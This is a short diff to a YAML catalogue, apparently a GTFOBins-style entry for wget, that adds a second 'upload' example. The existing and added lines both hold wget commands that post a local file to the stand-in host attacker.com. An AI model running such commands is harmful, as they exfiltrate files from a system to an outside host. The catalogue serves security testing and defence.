@@ -6,6 +6,9 @@ functions:
         export URL=http://attacker.com/
         export LFILE=file_to_send
         wget --post-data="d=$(base64 $LFILE | tr -d '\n')" $URL
+      code: |
+        export URL=http://attacker.com/
+        wget --post-file="/path/file_to_send" $URL
   download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
